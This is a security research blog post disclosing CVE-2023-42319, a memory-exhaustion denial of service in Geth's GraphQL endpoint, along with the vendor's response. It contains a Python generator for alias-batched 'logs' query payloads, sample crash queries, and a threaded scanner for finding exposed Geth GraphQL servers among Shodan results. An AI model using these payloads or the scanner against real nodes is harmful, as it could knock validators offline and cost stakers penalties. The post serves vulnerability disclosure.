---
weight: 1
title: "CVE-2023-42319 : Geth - DoS through GraphQL"
date: 2023-10-15
tags: ["Geth", "DoS", "GraphQL"]
draft: false
author: "fadam"
authorLink: ""
description: "CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint"
images: []
categories: ["Web2"]
lightgallery: true
resources:
  - name: "featured-image-preview"
    src: "templatebloggraphqldos.png"

toc:
  auto: false
---

<!--more-->

## 1. Introduction

[go-ethereum](https://geth.ethereum.org/) (Geth) is the most deployed Execution Layer for Ethereum.

GraphQL is a query language for APIs, commonly seen in Web2 applications querying the blockchain.

**Geth** proposes a GraphQL endpoint that can be activated by adding the option **--http --graphql** when starting the service.

However, this component is buggy and subject to Denial Of Service because:

- It consumes a lot of resources.
- It is possible to perform unlimited GraphQL requests within a single HTTP request.

The present research was conducted in during the month of June/July 2023, with the issue being sent to Geth team on July 4th 2023.

## 2. GraphQL batch of requests with aliases

When GraphQL endpoint is activated, a new path is available on the RPC server showing a GraphQL interface: **http://[@IP]:8545/graphql/ui**

Here is an example of a GraphQL query sent from the interface, to retrieve the current block number:

![Simple GraphQL query](1-simple-query.png)

The format of the GraphQL query is :

```code
query blockInfo() {
    block() {
      number
    }
}
```

Behind the scenes, when a GraphQL request is performed, the GraphQL request is encapsulated within a HTTP request :

<p align="center">
<img alt="Single HTTP/GraphQL request" src="2-http-1-graphql.png"  width=50% height=50%>
</p>

The concept of GraphQL aliases is to put multiple GraphQL queries within a simple HTTP request, like in the picture below:

<p align="center">
<img alt="Batch of GraphQL requests" src="3-http-batch.png"  width=50% height=50%>
</p>

In terms of GraphQL syntax, it looks like this:

```code
query{
	req01: block() {
		number
	}
	req02: block() {
		number
	}
	req03: block() {
		number
	}
	req04: block() {
		number
	}
	req05: block() {
		number
	}
}
```

The result of such a request is that the server will **treat each GraphQL query individually**, and return them within the same HTTP response.

![Batch result](4-http-batch-result.png "Batch Result From the GraphQL console")

This means that someone can ask the server to perform hundreds, even thousands of GraphQL operations **within a single HTTP request**, which can lead to resource exhaustion, therefore causing a **Denial Of Service**.

## 3. Exploitation

When the GraphQL service is enabled on Geth, it is possible to retrieve all the possible requests and arguments of GraphQL by performing the GraphQL **introspection query**:

```code
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

This request returns a large JSON, that can be uploaded on a website like [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/), or simply put in the **InQL Scanner** module for analysis:

![inQL Burp extension](5-inQL.png "BurpSuite InQL Scanner")

<u>Note:</u> since Geth is public, it is also possible to retrieve this information from the [source code](https://github.com/ethereum/go-ethereum/blob/master/graphql/schema.go).

By analyzing the results, the **logs** query is interesting because the filter **fromBlock** means that the server would have to recompute, for each GraphQL query, all the logs from the mentioned block.This **seems expensive in terms of resources**.

Using aliases for this query would look like this :

```code
query {
    request1: logs(filter: { fromBlock: 4188901 }) {
      data
      topics
      index
      transaction {
        gas
      }
      account(block: Long) {
        address
      }
(...)
    }
    request99: logs(filter: { fromBlock: 4188999 }) {
      data
      topics
      index
      transaction {
        gas
      }
      account(block: Long) {
        address
      }
    }
}
```

The following python script can be used to generate a payload:

```python
#Usage: python3 generate.py block_start alias_number
#Example: python3 generate.py 4188927 100

import argparse
import json

def generate_payload(start_block, num_aliases):
    payload = "query {\n"

    for i in range(1, num_aliases + 1):
        request_name = f"req{i:02d}"
        from_block = start_block + i - 1

        payload += f"  {request_name}: logs(filter: {{ fromBlock: {from_block} }}) {{\n"
        payload += "    data\n"
        payload += "    topics\n"
        payload += "    index\n"
        payload += "    transaction {\n"
        payload += "      gas\n"
        payload += "    }\n"
        payload += "    account(block: Long) {\n"
        payload += "      address\n"
        payload += "    }\n"
        payload += "  }\n"

    payload += "}\n"
    return payload

def main():
    parser = argparse.ArgumentParser(description="Generate a JSON payload for aliases")
    parser.add_argument("start_block", type=int, help="Start block number")
    parser.add_argument("num_aliases", type=int, help="Number of aliases")
    args = parser.parse_args()

    payload = generate_payload(args.start_block, args.num_aliases)

    with open("payload.json", "w") as json_file:
        json_file.write(payload)

if __name__ == "__main__":
    main()
```

This will generate a payload.json file that can be sent through the GraphQL interface :

![Exploitation with GraphiQL](6-geth-graphiql.png "GraphQL Console")

The tests were performed on a Sepolia full node, with 16Gb of RAM memory.

The node was synced, Consensus client was prysm. Nothing else was running on the server. Geth version used is the latest stable at the time : **1.12.2-stable-bed84606**.

The [first video](https://drive.google.com/file/d/12CnXF2nHxF9j6IuiaeZUMIJw_EcoKuXy/view?usp=sharing) shows that the node is living his life peacefully and is using 1.1Gb of RAM memory.

Then, at 00:10 the following GraphQL request was sent:

```code
query {
    request1: logs(filter: { fromBlock: 4188927 }) {
      data
      topics
      index
      transaction {
        gas
      }
      account(block: Long) {
        address
      }
    }
    request2: logs(filter: { fromBlock: 4088927 }) {
      data
      topics
      index
      transaction {
        gas
      }
      account(block: Long) {
        address
      }
    }
}
```

This single HTTP request is performing **only 2 GraphQL requests** with aliases.

When the request is fired, you can see:

1. At 00:40, the RAM memory went up to 9,4Gb of RAM (+8.3Gb for 2 GraphQL requests)
2. At the same time, request timeout on Web browser after 30 seconds (00:10 + 30 seconds)
3. However, memory went up to 10.6Gb and did not decrease for at least the remaining two minutes (sometimes, it decreases back to normal after 60 seconds but behavior is inconsistent).

With a simple request with 2 aliases, the Geth server is suffering.

Then to crash the node entirely, you can just add more queries (10 aliases), as shown in the [following video](https://drive.google.com/file/d/1dvgGe13yYQv1Ut34plof1b3OAeaD91gi/view?usp=sharing) where the node gets unresponsive after it reaches its RAM maximum (12.4Gb after 00:35).

## 4. Vulnerable servers in the wild

By using Shodan, looking for Geth servers having port 8445 port opened, it is possible to find a bit more than 8000 servers with Geth exposed. Among those, over 80 had the vulnerable GraphQL endpoint exposed.

The script below was used to identify vulnerable servers among the 8000 ones:

```python
import requests
import threading


# Input file containing IP addresses from Shodan
input_file = "input.txt"


# Output file to save GraphQL URIs
output_file = "graphql_uris.txt"


# Function to check an IP address and save GraphQL URIs
def check_ip(ip):
    # Add "http://" to the IP address
    url = f"http://{ip}"

    # Append "/graphql/ui" to the URL
    graphql_url = f"{url}:8545/graphql/ui"


    try:
        # Send an HTTP GET request
        response = requests.get(graphql_url)

        # Check if the response status code is 200 (OK)
        if response.status_code == 200 and "graphiql" in response.text.lower():
            # Print the "200 OK" result
            print(f"{graphql_url} - OK")
            with open(output_file, "a") as f:
                f.write(f"{graphql_url}\n")
    except:
        pass
        #print("Error with ip " + str(ip))


# Read IP addresses from the input file
with open(input_file, "r") as f:
    ips = f.readlines()


# Define a lock to ensure thread-safe writing to the output file
output_file_lock = threading.Lock()


# Function to process IPs in parallel
def process_ips(start, end):
    for i in range(start, end):
        ip = ips[i].strip()  # Remove leading/trailing whitespace
        if ip:
            check_ip(ip)


# Split the list of IPs into chunks for parallel processing
num_threads = 10
chunk_size = len(ips) // num_threads
threads = []


for i in range(num_threads):
    start = i * chunk_size
    end = start + chunk_size if i < num_threads - 1 else len(ips)
    thread = threading.Thread(target=process_ips, args=(start, end))
    threads.append(thread)
    thread.start()


# Wait for all threads to finish
for thread in threads:
    thread.join()
```

This is not a big number, but those servers might have a validator running using those vulnerable instances. Putting Geth down would cause the stakers financial harm since they could not validate attestations (they would even get [penalties](https://ethereum.org/fr/developers/docs/consensus-mechanisms/pos/rewards-and-penalties/#penalties)) and they could not participate in block proposals.

## 5. Ethereum response

Geth team was very reactive and professional.

Because the GraphQL feature is an option, it is out of scope of the Ethereum Bug Bounty program. More surprisingly, the team has no intention of fixing the issue.

This seems to be tied to the fact that they consider that [RPC port should be blocked in terms of Firewalling](https://geth.ethereum.org/docs/fundamentals/security).

![Old Security page](7-geth-security-old.png "Firewall Disclamer From Ethereum Fondation")

This however does not eliminate the issue and it is not difficult to find and exploit vulnerable servers in the wild.

After discussing with the team, they have decided to update the Security page of Geth to warn users about exposing the GraphQL endpoint :

![Ethereum response](8-eth-response.png "Mail from Ethereum Fondation")

Since September 5th, the Geth [webpage](https://geth.ethereum.org/docs/fundamentals/security) was updated. A special part regarding API Security was added, mentioning GraphQL among other topics :

<p align="center">
<img alt="Updated Security page" src="9-geth-new-security.png"  width=80% height=80%>
</p>
